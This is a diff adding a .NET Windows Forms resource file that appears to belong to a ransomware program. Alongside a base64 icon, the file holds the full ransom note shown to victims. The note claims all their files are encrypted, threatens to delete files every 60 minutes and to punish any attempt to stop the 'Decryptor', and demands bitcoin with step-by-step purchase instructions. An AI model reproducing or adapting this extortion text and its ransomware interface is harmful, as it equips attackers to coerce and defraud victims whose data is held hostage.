@@ -1,0 +1,64 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+<resheader name="resmimetype"><value>text/microsoft-resx</value></resheader><resheader name="version"><value>1.3</value></resheader><resheader name="reader"><value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><resheader name="writer"><value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><data name="$this.Icon" mimetype="application/x-microsoft.net.object.binary.base64"><value>AAEAAAD/////AQAAAAAAAAAMAgAAAFFTeXN0ZW0uRHJhd2luZywgVmVyc2lvbj0yLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWIwM2Y1ZjdmMTFkNTBhM2EFAQAAABNTeXN0ZW0uRHJhd2luZy5JY29uAgAAAAhJY29uRGF0YQhJY29uU2l6ZQcEAhNTeXN0ZW0uRHJhd2luZy5TaXplAgAAAAIAAAAJAwAAAAX8////E1N5c3RlbS5EcmF3aW5nLlNpemUCAAAABXdpZHRoBmhlaWdodAAACAgCAAAAAAAAAAAAAAAPAwAAAH4EAAACAAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAIY/AACGPwAAAAAAAAAAAAAAAAAAAAAAANGSEQDRkhED0ZIRMNGSEWDRkhFh0ZIRVdGSEVXRkhFh0ZIRYNGSETDRkhED0ZIRAAAAAAAAAAAAAAAAANGSEQDRkhEI0ZIRS9GSEUzRkhEX0ZIRAtGSEQDRkhEA0ZIRAtGSERfRkhFM0ZIRS9GSEQjRkhEAAAAAANGSEQDRkhEF0ZIRT9GSETfRkhEB0ZIRAAAAAAAAAAAAAAAAAAAAAADRkhEA0ZIRAdGSETfRkhFO0ZIRBNGSEQDRkhEA0ZIRN9GSEULRnQYA1pcBINOeATnPqQE5zLMBOci9ADnFxwA5wdIAOb7ZAB/FxAMA0ZIRQ9GSETbRkhEA0ZIRDdGSEVbRkhEKr+EeANaXAZfTngH3z6kB88yzAenIvQDpxccA88HSAPe+2QCW3HQPANGSEQvRkhFX0ZIRDdGSETPRkhE+0ZIQAOVuAQHWlwGi054B/8+pAf/NsQGgx8AAocXHAP/B0gD/vtoAoaH/AADQlBAA0ZIRP9GSETHRkhE70ZIRHdGSEADlbQEB1pcBotOeAf/PqQH/zbABisfAAIzFxwD/wdIA/77aAKGh/wAA0JUQANGSESLRkhFL0ZIRSdGSERXRkhAA5W0BAdaXAaLTngH/z6kB/c2uAV7HwgBgxccA/sHSAP++2gChof8AANCVEADRkhEq0ZIRg9GSEYjRkhEs0ZIQAOVsAQHWlwGi054B/8+pAf7MsQGZyL8AmsXHAP7B0gD/vtoAoJ//AADQlhAA0ZIRGdGSEVXRkhFM0ZIRItGSEQDOqwEA1pcBV9OfAd/QqAGlzLMBici9AInEyAClwdEA377ZAFbEyQAA0ZMRANGSER7RkhE70ZIRMtGSET7RkhEA1J0BANWaAQnSoAGy0aMBRdGjAQDDzQAAw80ARcLQALO/1gAJwNQAANGSEQDRkhE/0ZIRMtGSEQ3RkhFW0ZIRC9GTDwDJugEA0qIBitCnAZvMsQERyL8AEcTKAJvCzwCKzLUAAM+aDwDRkhEL0ZIRV9GSEQ3RkhEA0ZIRN9GSEULRkhEA0aMCANGjASHPqgGvzLMBv8i+AL/FxwCvw80AIcTJAQDRkhEA0ZIRQ9GSETbRkhEA0ZIRANGSEQTRkhFP0ZIRN9GSEQHOqgQAzqwBEMu0AT/IvAA/xsQAEcm1BADRkhEB0ZIRONGSEU7RkhEE0ZIRAAAAAADRkhEA0ZIRCNGSEUvRkhFM0ZIRF9GREgLRkxEA0ZMRANKQEgLRkhEX0ZIRTNGSEUrRkhEI0ZIRAAAAAAAAAAAAAAAAANGSEQDRkhED0ZIRMNGSEWDRkhFh0ZIRVtGSEVbRkhFh0ZIRYNGSES/RkhED0ZIRAAAAAAAAAAAA4AcAAMGDAACH4QAAkAkAABAIAAAgBAAAIAQAACAEAAAgBAAAMAwAADGMAAAYGAAAmBkAAIQhAADBgwAA4AcAAAs=</value></data><data name="textBox1.Text"><value>
+
+
+All your important files , documents , photos, videos , databases and  projects are encrypted and locked 
+they are no longer acessible. Maybe you are busy looking for a way to recover your files , but do not 
+waste your time. Nobody can recover your files without our decryption key .
+-Do not try to remove decryptor because this is the only way you can get files back .
+-Do not try to kill Decryptor because you will get files deleted as punishment.
+Every 60 minutes some of your files get deleted so you have no time .
+
+
+
+Sure!
+We guarantee that you can recover all your files safely and easily. 
+Firstly Send payment to the address below .
+All you need is to send email to : your email With subject "Infected"
+I will reply in few minutes and provide the decrypt key .
+
+
+
+
+
+Payment is accepted in bitcoin only .
+For more information click "What is bitcoin" to the left. 
+You can buy bitcoin easly. 
+Step 1 : Go to www.localbitcoins.com .
+Step 2 : Create an account .
+Step 3 : Buy bitcoins  .
+Step 4 : Send to address below .
+
+After payment send us email for decryption key .
+
+
+</value></data>
+  </root>
